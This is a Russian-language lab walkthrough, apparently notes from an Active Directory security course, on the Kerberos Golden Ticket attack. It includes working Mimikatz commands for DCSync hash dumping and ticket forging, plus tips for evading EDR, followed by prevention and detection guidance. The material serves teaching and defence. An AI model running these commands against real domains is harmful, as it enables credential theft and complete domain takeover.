=====================================================================
* Руководство *
***************

Это пошаговое руководство, цель которой — продемонстрировать проблему, а не подробно описать атаку.

Атака будут выполняться с предоставленных машин Windows 10 (WS001) и Kali Linux.
Предполагается, что злоумышленник уже получил remote code execution (или что-то подобное) на этой машине Windows 10 (WS001).
Пользователь, который, как мы предполагаем, скомпрометирован, — это Боб, обычный пользователь в Active Directory без назначенных специальных разрешений.

Окружение состоит из следующих машин и соответствующих им IP-адресов:

	-	DC1		172.16.18.3
	-	DC2		172.16.18.4
	-	Server01	172.16.18.10
	-	PKI		172.16.18.15
	-	WS001		DHCP или 172.16.18.25 (в зависимости от раздела)
	-	Kali Linux	DHCP или 172.16.18.20 (в зависимости от раздела)

Если надо подключиться к любой из управляющих машин AD сервера (к примеру - DC1)

	i)		Поключаемся к хосту жертвы через RDP
	ii)		Пуск -> Windows Accessories -> Remote Desktop
	iii)		Computer	=	DC1 ip address
			User Name	=	Имя пользователя (к примеру htb-student)
	iv)		Пароль введем позже (будет предоставлен запрос)
	v)		Соглашаемся на устанвку соединения
	
=====================================================================
* Легенда *
***********

Kerberos Golden Ticket — это атака, в которой щлоумышленники могут создавать/генерировать билеты для любого пользователя в домене, таким образом, фактически выступая в качестве контроллера домена.

При создании домена по умолчанию создается уникальная учетная запись пользователя krbtgt
krbtgt — это отключенная учетная запись, которую нельзя удалить, переименовать или включить.
Служба KDC контроллера домена будет использовать пароль krbtgt для получения ключа, которым она подписывает все билеты Kerberos.
Хэш этого пароля является самым доверенным объектом во всем домене, поскольку именно так объекты гарантируют, что домен среды выдал билеты Kerberos.

Следовательно, любой пользователь, обладающий хешем пароля krbtgt, может создавать действительные билеты Kerberos TGT.
Поскольку krbtgt подписывает их, поддельные TGT считаются действительными билетами в среде.
Раньше можно было даже создавать TGT для несуществующих пользователей и назначать любые привилегии их учетным записям.
Поскольку хэш пароля krbtgt подписывает эти билеты, весь домен слепо доверяет им, ведя себя так, как будто пользователь(и) существуют и обладают привилегиями, указанными в билете.

Атака Golden Ticket позволяет нам повышать права с любого дочернего домена до родительского в том же лесу.
Таким образом, мы можем повышать права до рабочего домена с любого тестового домена, который у нас может быть, поскольку домен не является границей безопасности.

Эта атака обеспечивает средства для повышения устойчивости в домене.
Она происходит после того, как злоумышленник получает привилегии администратора домена (или аналогичные).

=====================================================================
* Схема атаки *
***************

Для выполнения атаки Golden Ticket мы можем использовать Mimikatz со следующими аргументами:

	-	/domain
		Имя домена.

	-	/sid
		Значение SID домена.

	-	/rc4
		Хэш пароля krbtgt.

	-	/user
		Имя пользователя, для которого Mimikatz выдаст билет (Windows 2019 блокирует билеты, если они предназначены для несуществующих пользователей.)

	-	/id
		Относительный идентификатор (последняя часть SID) пользователя, для которого Mimikatz выдаст билет.

Кроме того, продвинутые злоумышленники часто указывают значения для аргументов /renewmax и /endin, так как в противном случае Mimikatz сгенерирует билет(ы) со сроком действия 10 лет, что делает его очень легко обнаруживаемым с помощью EDR:

	-	/renewmax
		Максимальное количество дней, в течение которых билет может быть продлен.

	-	/endin
		Окончание срока действия билета.


Во-первых, сперва нам нужно получить хэш пароля krbtgt и значение SID Домена.
Для этого используем атаку DCSync с аккаунтом Рокки из предыдущей атаки, чтобы получить хэш:

***	Как всегда, не забываем изменить политику запуска исполняемых файлов (если необходимо) и импортировать данный скрипт с базу командлетов системы

		PS C:\...\...\...> powershell.exe -ExecutionPolicy Bypass -File <script_file_name.ps1>

Потом нам нужно запустить новую командную оболочку (из-под cmd), работающую от имени найденого пользователя используя утилиту runas
Но для этого, нам надо знать пароль данного пользователя

	C:\...\...\...>runas /user:<domain_name>\<user_name> cmd.exe

Затем нам нужно использовать Mimikatz, как один из главных инструментов с реализацией для выполнения DCSync.
Мы можем запустить его, указав имя пользователя, хеш пароля которого мы хотим получить в случае успешной атаки, в данном случае пользователя «Администратор»

	C:\Mimikatz>mimikatz.exe

	mimikatz # lsadump::dcsync /domain:<domain_name>.local /user:Administrator


В полученном результате нас интересует раздел Credentials

	Hash NTLM: db0d0630064747072a7da3f7c3b4069e (у Вас хэш будет другой)

Можно указать параметр /all вместо конкретного имени пользователя, что позволит выгрузить хэши всей среды AD.

Далее мы воспользуемся функцией Get-DomainSID из PowerView для получения значения SID домена
***	Обратите внимание - наличи "." поле параметра -File и перед название скрипта .\PowerView.ps1 НЕ ЯВЛЯЕТСЯ ошибкой. Так надо 

	C:\...\...\...> powershell.exe -ExecutionPolicy Bypass -File . .\PowerVeiw.ps1
	C:\...\...\...> Get-DomainSID
	S-1-5-21-1518138621-4282902758-752445584 (y Вас SID будет другой)

Теперь, вооружившись всей необходимой информацией, мы можем использовать Mimikatz для создания тикета для учетной записи Administrator.
***	Аргумент /ptt заставляет Mimikatz передать тикет в текущий сеанс
Открываем новый CMD терминал

	C:\...\...>mimikatz.exe

	mimikatz # kerberos::golden /domain:<domain_name>.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt

Если результат содержит надпись	-	"Golden ticket for 'Administrator @ <doamin_name>.local' successfully submitted for current session"
То это означает, что Mimikatz внедрил билет в текущий сеанс, и мы можем проверить это, выполнив команду klist (после выхода из Mimikatz)

	C:\...\...>klist

	Current LogonId is 0:0x1ac823c

	Cached Tickets: (1)

	#0>     Client: Administrator @ eagle.local
       		Server: krbtgt/eagle.local @ eagle.local
        	KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        	Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        	Start Time: 2/9/2025 22:00:04 (local)
        	End Time:   2/9/2025 22:08:04 (local)
        	Renew Time: 2/9/2025 22:07:04 (local)
        	Session Key Type: RSADSI RC4-HMAC(NT)
        	Cache Flags: 0x1 -> PRIMARY
        	Kdc Called:

Чтобы убедиться, что тикет работает, мы можем перечислить содержимое C$-ресурса DC1, используя его.

	C:\...\...> \\dc1\c$

=====================================================================
* Предотвращение/защита *
*************************

Предотвратить создание поддельных билетов сложно, поскольку KDC генерирует действительные билеты, используя ту же процедуру.
Поэтому, как только злоумышленник получит всю необходимую информацию, он сможет подделать билет.
Тем не менее, есть несколько вещей, которые мы можем и должны сделать:

	-	Заблокировать аутентификацию привилегированных пользователей на любом устройстве.
	-	Периодически сбрасывайте пароль учетной записи krbtgt
		Cекретность этого хэш-значения имеет решающее значение для Active Directory.
		При сбросе пароля krbtgt (независимо от его надежности) он всегда будет перезаписан новым, случайно сгенерированным и криптографически безопасным.
		Настоятельно рекомендуется использовать скрипт Microsoft для изменения пароля krbtgt	-	KrbtgtKeys.ps1 (https://github.com/microsoftarchive/New-KrbtgtKeys.ps1)
		Поскольку он имеет режим аудита, который проверяет домен для предотвращения последствий при смене пароля.
		Он также принудительно выполняет репликацию DC по всему миру, поэтому все контроллеры домена мгновенно синхронизируют новое значение, что снижает потенциальные сбои в работе.
	-	Принудительно применять фильтрацию SIDHistory между доменами в лесах, чтобы предотвратить эскалацию из дочернего домена в родительский
		Поскольку путь эскалации подразумевает злоупотребление свойством SIDHistory путем установки его на значение привилегированной группы, например, Enterprise Admins
		Однако это может привести к потенциальным проблемам при миграции домена

=====================================================================
* Обнаружение *
***************

Корреляция поведения пользователей — лучший метод обнаружения злоупотреблений поддельными билетами.

Предположим, мы знаем место и время, которые пользователь регулярно использует для входа в систему.
В этом случае будет легко оповещать о других (подозрительных) поведениях
Например, рассмотрим учетную запись «Администратор» в атаке, описанной выше.
Если зрелая организация использует рабочие станции с привилегированным доступом (PAW), она должна быть начеку о любых привилегированных пользователях, не проходящих аутентификацию с этих машин, проактивно отслеживая события с идентификаторами 4624 и 4625 (успешный и неудачный вход в систему).

Контроллеры домена не будут регистрировать события, когда агент угрозы подделывает Golden Ticket с скомпрометированной машины.
Однако при попытке доступа к другой системе (системам) мы увидим события успешного входа, происходящие с скомпрометированной машины

Другой точкой обнаружения может быть служба TGS, запрошенная для пользователя без предыдущего TGT.
Однако это может быть утомительной задачей из-за огромного объема билетов (и многих других факторов).
Если вернуться к сценарию атаки, запустив dir \\dc1\c$ в конце, мы сгенерировали два билета TGS на контроллере домена
Единственное различие между билетами — это служба.
Однако они являются обычными по сравнению с теми же событиями, не связанными с золотым билетом.

Если включена фильтрация SID, мы получим оповещения с идентификатором события 4675 (SIDs were filtered) во время междоменной эскалации.

Если лес Active Directory был скомпрометирован, нам необходимо сбросить пароли всех пользователей и отозвать все сертификаты, а для krbtgt мы должны сбросить его пароль дважды (в каждом домене).
Так как значение истории паролей для учетной записи krbtgt равно 2.
Поэтому она хранит два последних пароля.
Сбрасывая пароль дважды, мы фактически очищаем все старые пароли из истории, поэтому нет возможности, чтобы другой DC реплицировал этот DC, используя старый пароль.
Однако рекомендуется, чтобы этот сброс пароля происходил по крайней мере с интервалом в 10 часов друг от друга (максимальное время жизни билета пользователя)
В противном случае ожидайте, что некоторые службы сломаются, если сделать это за более короткий период.

=====================================================================
* Ловушка/Honeypot *
********************

К сожалению вариантов с ловушкой для данного вида атаки представлено не было